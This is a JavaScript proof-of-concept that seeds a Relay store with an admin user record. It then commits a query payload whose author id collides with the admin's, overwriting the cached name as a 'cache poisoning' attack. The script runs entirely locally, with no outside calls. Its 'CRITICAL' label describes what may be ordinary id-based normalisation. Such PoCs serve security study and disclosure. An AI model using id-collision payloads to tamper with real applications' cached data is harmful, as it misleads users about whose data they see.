// PoC: RelayCachePoisoning.js
const RelayRuntime = require('relay-runtime');
const {
    createOperationDescriptor,
    Environment,
    Network,
    RecordSource,
    Store
} = RelayRuntime;

// 1. Setup Real Relay Environment
const source = new RecordSource();
const store = new Store(source);
const network = Network.create((operation, variables) => {
    return Promise.resolve({ data: {} });
});
const environment = new Environment({ network, store });

// 2. Pre-seed the store with an Admin user
const ADMIN_ID = "User:AdminID";
const adminRecord = {
    __id: ADMIN_ID,
    __typename: 'User',
    id: ADMIN_ID,
    name: "Admin User",
    role: "admin"
};
source.set(ADMIN_ID, adminRecord);

// Verify initial state
const initialSnapshot = source.get(ADMIN_ID);
console.log("[*] Initial Admin Name:", initialSnapshot.name);

// 3. Define the Malicious Payload
const maliciousPayload = {
    post: {
        id: "post-1",
        title: "Malicious Post",
        author: {
            id: ADMIN_ID, // COLLISION!
            name: "HACKED NAME"
        }
    }
};

// Mocking the operation
const operation = createOperationDescriptor(
    {
        kind: 'Request',
        fragment: {
            kind: 'Fragment',
            name: 'PostQuery',
            type: 'Query',
            argumentDefinitions: [],
            selections: [
                {
                    kind: 'LinkedField',
                    name: 'post',
                    alias: null,
                    storageKey: null,
                    args: null,
                    concreteType: 'Post',
                    plural: false,
                    selections: [
                        { kind: 'ScalarField', name: 'id', alias: null, args: null, storageKey: null },
                        { kind: 'ScalarField', name: 'title', alias: null, args: null, storageKey: null },
                        {
                            kind: 'LinkedField',
                            name: 'author',
                            alias: null,
                            storageKey: null,
                            args: null,
                            concreteType: 'User',
                            plural: false,
                            selections: [
                                { kind: 'ScalarField', name: 'id', alias: null, args: null, storageKey: null },
                                { kind: 'ScalarField', name: 'name', alias: null, args: null, storageKey: null }
                            ]
                        }
                    ]
                }
            ]
        },
        operation: {
            kind: 'Operation',
            name: 'PostQuery',
            argumentDefinitions: [],
            selections: [
                 {
                    kind: 'LinkedField',
                    name: 'post',
                    alias: null,
                    storageKey: null,
                    args: null,
                    concreteType: 'Post',
                    plural: false,
                    selections: [
                        { kind: 'ScalarField', name: 'id', alias: null, args: null, storageKey: null },
                        { kind: 'ScalarField', name: 'title', alias: null, args: null, storageKey: null },
                        {
                            kind: 'LinkedField',
                            name: 'author',
                            alias: null,
                            storageKey: null,
                            args: null,
                            concreteType: 'User',
                            plural: false,
                            selections: [
                                { kind: 'ScalarField', name: 'id', alias: null, args: null, storageKey: null },
                                { kind: 'ScalarField', name: 'name', alias: null, args: null, storageKey: null }
                            ]
                        }
                    ]
                }
            ]
        },
        params: {
            name: 'PostQuery',
            operationKind: 'query',
            text: 'query PostQuery { post { id title author { id name } } }',
            id: null,
            cacheID: 'post-query-cache-id',
            metadata: {},
            providedVariables: {}
        }
    },
    {} // variables
);

console.log("[*] Committing Malicious Payload (Cache Poisoning Attack)...");

// Robust commitPayload resolution
let commitPayload = RelayRuntime.commitPayload;
if (!commitPayload && environment.commitPayload) {
    commitPayload = (env, op, payload) => env.commitPayload(op, payload);
}

if (!commitPayload) {
    console.error("[-] FATAL: commitPayload not found in relay-runtime exports or Environment instance.");
    process.exit(1);
}

try {
    // 4. Execution
    commitPayload(environment, operation, maliciousPayload);

    // 5. Verification
    const updatedAdmin = source.get(ADMIN_ID);
    console.log("[*] Updated Admin Name:", updatedAdmin.name);

    if (updatedAdmin.name === "HACKED NAME") {
        console.error("\n[!!!] CRITICAL: Store Cache Poisoning Successful!");
        console.error("[+] The global store record for Admin was overwritten by a malicious payload from an unrelated query.");
    } else {
        console.log("\n[-] Attack Failed: Admin name preserved.");
    }

} catch (e) {
    console.error("[-] Error during commit:", e);
}
